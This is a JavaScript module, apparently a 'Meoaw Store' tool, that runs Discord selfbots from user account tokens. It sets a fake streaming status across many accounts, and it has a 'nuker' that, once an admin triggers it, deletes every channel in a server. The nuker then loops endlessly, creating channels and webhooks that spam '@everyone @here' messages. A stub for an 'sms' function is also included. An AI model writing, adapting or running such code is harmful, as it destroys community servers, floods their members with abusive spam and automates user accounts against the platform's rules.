const express = require('express')
const colors = require('colors')
const selfdiscord = require("discord.js-selfbot-v13");

async function host() {
    console.log(colors.green("- Mode host is using!"));
    let app = express()

    app.get("/", (req, res) => {
        res.send("Host server: Powered by Meoaw Store!")
    })

    try {
        app.listen(3000, () => {
            console.log(colors.green("[LOG] Started host server!"));
        })

        return "Check status on 127.0.0.1:3000";
    } catch (err) {
        console.log(colors.red("[ERROR] Can't start host server!"));

        return "ERROR!";
    }

}

async function discordstreaming(token, status) {
    if(!status) status = "Online🟢";
    console.log(colors.green("- Mode Streaming Status is using!"));

    if(typeof token == "string") {
        const client = new selfdiscord.Client({
            checkUpdate: false
        });

        client.on("ready", async () => {
            console.log(colors.green("[LOG] Logined to token"))
            console.log("- Logined as "+client.user.tag)

            client.user.setActivity(status, {
                type: "STREAMING",
                url: "https://www.twitch.tv/meoawjs"
            });
        });

        client.login(token).catch(err => {
            console.log(colors.red("[ERROR] Can't login to token!"))
        });
    } else if (typeof token == "object") {
        if(Array.isArray(token)) {
            token.forEach(token_db => {
                const client = new selfdiscord.Client({
                    checkUpdate: false
                });
        
                client.on("ready", async () => {
                    console.log(colors.green("[LOG] Logined to token (Mode: Streaming)"))
                    console.log("- Logined as "+client.user.tag)

                    client.user.setActivity(status, {
                        type: "STREAMING",
                        url: "https://www.twitch.tv/meoawjs"
                    });
                });
        
                client.login(token_db).catch(err => {
                    console.log(colors.red("[ERROR] Can't login to token!"))
                });
            })
        } else {
            console.log(colors.red("[ERROR] Token isn't incorrect!"));
        }
    } else {
        console.log(colors.red("[ERROR] Token isn't incorrect!"));
    }
}


async function discordnuker(config) {
    if(!config.token || !config.command) {
        return console.log(colors.red("[ERROR] Config is incorrect"));
    }
    if(!config.message) config.message = "meoaw.js";
    if(!config.channel) config.channel = "nuker-meoaw";

    console.log(colors.green("- Mode Nuker is using!"));

    const client = new selfdiscord.Client({
        checkUpdate: false
    });
    
    client.on("ready", async () => {
        console.log(colors.green("[LOG] Logined to token (Mode: Nuker)"));
        console.log("- Logined as "+client.user.tag)
    });


    client.on("messageCreate", async (message) => {
        if (message.content == config.command && message.guild && message.member.permissions.has(selfdiscord.Permissions.FLAGS.ADMINISTRATOR)) {
            if(!config.message) {
                return console.log(colors.red("[ERROR] Can't find message to spam"));
            }
            if(!config.channel) {
                return console.log(colors.red("[ERROR] Can't find name channel to make!"))
            }
            
            message.delete().catch(() => {})
            message.guild.channels.cache.map(c => c.delete().catch(()=>{}))
            setInterval(() => {
                message.guild.channels.create(config.channel, { 
                    type: "GUILD_TEXT"
                }).then(channel => {
                    setInterval(() => {
                        channel.createWebhook(config.channel)
                        .then(webhook => {
                            setInterval(() => {
                                webhook.send("@everyone @here"+config.message).catch(() => {})
                            });
                        })
                        .catch(()=>{});

                        channel.send("@everyone @here"+config.message).catch(() => {})
                    })
                }).catch(() => {})
                message.guild.channels.create(config.channel, { 
                    type: "GUILD_VOICE"
                }).then(channel => {
                    setInterval(() => {
                        channel.send("@everyone @here"+config.message).catch(() => {})
                    })
                }).catch(() => {})
            })

        }
    });

    client.login(config.token).catch(err => {
        console.log(colors.red("[ERROR] Can't login to token!"))
    });
}

async function sms(phone) {
    console.log(colors.yellow("[LOG] Coming soon."))
}

module.exports = {
    host: host,
    sms: sms,
    discord: {
     streaming: discordstreaming,
     nuker: discordnuker
    },
}